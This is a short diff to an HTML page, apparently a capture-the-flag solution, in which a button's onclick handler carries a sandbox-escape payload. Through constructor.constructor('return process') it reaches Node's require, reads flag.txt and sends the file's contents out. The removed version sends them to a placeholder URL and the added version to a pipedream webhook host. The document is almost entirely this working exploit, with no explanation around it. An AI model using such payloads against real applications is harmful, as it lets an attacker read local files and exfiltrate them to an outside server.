@@ -8,10 +8,6 @@
 </head>
 <body>
     <p id="hello">Hello, World!</p>
-    <button class="next" onclick="global.constructor.constructor('return process')().mainModule.require('fs').readFile('flag.txt', 'utf8', function(err, fuck) {
-        const mod = global.constructor.constructor('return process')().mainModule;
-        const fetch = mod.require('node-fetch');
-        fetch('<URL>' + fuck)
-    })">Butt</button>
+    <button class="next" onclick=`const ForeignFunction = this.constructor.constructor;const process = ForeignFunction('return process')(); const require = process.mainModule.require; require('http').get('http://webhook.x.pipedream.net/?q=' + require('fs').readFileSync('flag.txt'));`>NEXT</button>
 </body>
 </html>
